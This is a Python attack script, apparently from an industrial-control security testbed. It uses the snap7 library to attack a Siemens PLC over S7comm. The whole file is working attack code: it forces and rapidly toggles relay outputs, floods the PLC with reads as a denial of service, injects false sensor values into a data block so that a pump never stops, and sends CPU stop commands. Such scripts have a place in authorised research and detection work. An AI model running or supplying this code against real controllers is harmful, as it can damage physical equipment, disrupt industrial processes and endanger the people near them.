#!/usr/bin/env python3
# PD: S7comm (snap7 / classic 0x32) output-write attack client for PLC1. Based on Amit's exploit_plc_conveyor /
# logic_flap. Writes the process-image output area (PA=0x82, byte 0 => Q0.0..Q0.7) — this is what clicks the relay.
# --flap toggles Q0.0 on/off (audible clicking); default writes a single value; leaves outputs OFF on exit.
import snap7, argparse, time, sys
try:
    from snap7.type import Area; PA = Area.PA          # python-snap7 3.x
except Exception:
    PA = 0x82                                          # older API takes the raw area code
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', required=True)
    ap.add_argument('--val', type=lambda x: int(x, 0), default=0x08)  # byte to QB0; 0x08 = Q0.3 (the relay/light on TB1)
    ap.add_argument('--count', type=int, default=1)
    ap.add_argument('--flap', action='store_true')
    ap.add_argument('--storm', action='store_true')  # aggressive high-rate flicker (DoS-style) for a bounded burst
    ap.add_argument('--secs', type=float, default=20.0)  # storm duration
    ap.add_argument('--hz', type=float, default=10.0)    # storm toggle rate (cycles/s); --hz 0 = as fast as snap7 allows
    ap.add_argument('--read', action='store_true')   # legit S7 read (monitoring)
    ap.add_argument('--readstorm', action='store_true')  # A5: volumetric READ flood — a *legal* op abused for DoS
    ap.add_argument('--dbspoof', action='store_true')    # D3: sensor false-data injection — pin a DB REAL (false level)
    ap.add_argument('--db', type=int, default=0)         # DB number (read it off TIA: Tank/Sim DB)
    ap.add_argument('--offset', type=int, default=0)     # byte offset of the REAL Level in the DB (usually 0)
    ap.add_argument('--spoofval', type=float, default=20.0)  # false level to pin (20 < LowL 30 -> pump never stops)
    ap.add_argument('--stop', action='store_true')   # PLC-Stop job (kill switch)
    ap.add_argument('--start', action='store_true')  # PLC hot-start (recover after a stop)
    ap.add_argument('--rack', type=int, default=0); ap.add_argument('--slot', type=int, default=1)
    a = ap.parse_args()
    c = snap7.client.Client()
    c.connect(a.host, a.rack, a.slot)
    if not c.get_connected():
        print("[-] connect FAILED to %s" % a.host); sys.exit(1)
    print("[*] CONNECTED to PLC %s (S7comm)" % a.host)
    def w(v):
        c.write_area(PA, 0, 0, bytearray([v & 0xFF]))
    if a.read:
        d = c.read_area(PA, 0, 0, 1); print("[+] READ QB0 = 0x%02X (legit monitoring)" % d[0])
    elif a.readstorm:
        dt = 0.0 if a.hz <= 0 else 1.0 / a.hz
        print("[!] READ-STORM on %s: ~%s reads for %.0fs (volumetric DoS with a LEGAL op — no single read is forbidden)"
              % (a.host, ("MAX rate" if a.hz <= 0 else "%.0f/s" % a.hz), a.secs))
        end = time.time() + a.secs; i = 0
        try:
            while time.time() < end:
                c.read_area(PA, 0, 0, 1); i += 1
                if dt: time.sleep(dt)
                if i % 50 == 0: print("    %s : %d reads" % (a.host, i))
        except (KeyboardInterrupt, Exception) as e:
            print("    read-storm interrupted (%s)" % type(e).__name__)
        print("[+] READ-STORM done on %s (%d reads)" % (a.host, i))
    elif a.dbspoof:
        import struct as _st
        dt = 0.0 if a.hz <= 0 else 1.0 / a.hz
        print("[!] SENSOR-SPOOF on %s: pinning DB%d.%d = %.1f for %.0fs (false level -> deceive control + HMI)"
              % (a.host, a.db, a.offset, a.spoofval, a.secs))
        payload = bytearray(_st.pack('>f', a.spoofval))         # S7 REAL = big-endian 32-bit float
        end = time.time() + a.secs; i = 0
        try:
            while time.time() < end:
                c.db_write(a.db, a.offset, payload); i += 1   # write-var 0x05 -> CARS classifies CONTROL
                if dt: time.sleep(dt)
                if i % 50 == 0: print("    %s : %d spoof writes" % (a.host, i))
        except (KeyboardInterrupt, Exception) as e:
            print("    sensor-spoof interrupted (%s)" % type(e).__name__)
        print("[+] SENSOR-SPOOF done on %s (%d writes)" % (a.host, i))
    elif a.stop:
        print("[!] SENDING PLC-STOP (halts the CPU)"); c.plc_stop(); print("[+] stop sent")
    elif a.start:
        print("[*] SENDING PLC HOT-START (recover)"); c.plc_hot_start(); print("[+] start sent")
    elif a.flap:
        print("[!] LOGIC-FLAP: toggling QB0=0x%02X @2Hz (listen for the relay). Ctrl-C to stop." % a.val)
        i = 0
        try:
            while True:
                w(a.val); time.sleep(0.5); w(0x00); time.sleep(0.5); i += 1
                if i % 5 == 0: print("    %d toggle cycles" % i)
        except KeyboardInterrupt:
            w(0x00); print("\n[+] stopped, Q0 cleared")
    elif a.storm:
        dt = 0.0 if a.hz <= 0 else 1.0 / (2 * a.hz)
        print("[!] STORM on %s: hammering QB0=0x%02X<->0x00 for %.0fs @ %s (aggressive flicker / DoS-style)."
              % (a.host, a.val, a.secs, ("MAX rate" if a.hz <= 0 else "%.0f Hz" % a.hz)))
        end = time.time() + a.secs; i = 0
        try:
            while time.time() < end:
                w(a.val)
                if dt: time.sleep(dt)
                w(0x00)
                if dt: time.sleep(dt)
                i += 1
                if i % 50 == 0: print("    %s : %d toggle cycles" % (a.host, i))
        except KeyboardInterrupt:
            pass
        w(0x00); print("[+] STORM done on %s (%d cycles), Q0 cleared" % (a.host, i))
    else:
        for i in range(a.count):
            w(a.val); print("[+] wrote 0x%02X to QB0 (Q0.0=%d)" % (a.val, a.val & 1)); time.sleep(0.3)
    c.disconnect()
if __name__ == "__main__":
    main()
